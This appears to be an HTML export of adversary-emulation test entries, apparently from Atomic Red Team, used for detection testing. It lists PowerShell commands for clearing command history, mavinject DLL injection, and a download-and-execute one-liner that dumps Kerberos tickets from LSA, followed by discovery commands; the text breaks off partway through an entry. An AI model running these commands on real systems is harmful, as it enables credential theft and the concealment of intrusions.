<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: da75ae8d-26d6-4483-b0fe-700e4df4f037</li>
<li><strong>name</strong>: Clear Powershell History by Deleting History File</li>
<li>
<p><strong>description</strong>: Clears Powershell history</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Remove-Item (Get-PSReadlineOption).HistorySavePath</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1070.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 22c779cd-9445-4d3e-a136-f75adbf0315f</li>
<li><strong>name</strong>: Clear PowerShell Session History</li>
<li>
<p><strong>description</strong>: This technique involves using the Clear-History cmdlet in PowerShell to remove all records of previously executed commands.
This action is often performed by attackers to eliminate traces of their activities, making incident detection and forensic 
investigation more challenging. By clearing the session history, adversaries aim to obfuscate their operational footprint.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Clear-History</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1070.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 74496461-11a1-4982-b439-4d87a550d254</li>
<li><strong>name</strong>: Process Injection via mavinject.exe</li>
<li><strong>description</strong>: Windows 10 Utility To Inject DLLS.</li>
</ul>
<p>Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $mypid = #{process_id}
mavinject $mypid /INJECTRUNNING "#{dll_payload}"
Stop-Process -processname notepad</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1055.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2dfa3bff-9a27-46db-ab75-7faefdaca732</li>
<li><strong>name</strong>: Dump Kerberos Tickets from LSA using dumper.ps1</li>
<li>
<p><strong>description</strong>: This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.
If the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.
Ref: https://github.com/MzHmO/PowershellKerberos/
Author of dumper.ps1: Michael Zhmaylo (@MzHmO)</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  </p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1003.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3b3809b6-a54b-4f5b-8aff-cb51f2e97b34</li>
<li><strong>name</strong>: Process Discovery - Get-Process</li>
<li><strong>description</strong>: Utilize Get-Process PowerShell cmdlet to identify processes.</li>
</ul>
<p>Upon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. </p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Get-Process</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1057</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b51239b4-0129-474f-a2b4-70f855b9f2c2</li>
<li><strong>name</strong>: Process Discovery - get-wmiObject</li>
<li><strong>description</strong>: Utilize get-wmiObject PowerShell cmdlet to identify processes.</li>
</ul>
<p>Upon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. </p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: get-wmiObject -class Win32_Process</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1057</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7</li>
<li><strong>name</strong>: Permission Groups Discovery PowerShell (Domain)</li>
<li>
<p><strong>description</strong>: Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: get-ADPrincipalGroupMembership #{user} | select name</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a2d71eee-a353-4232-9f86-54f4288dd8c1</li>
<li><strong>name</strong>: Find machines where user has local admin access (PowerView)</li>
<li>
<p><strong>description</strong>: Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
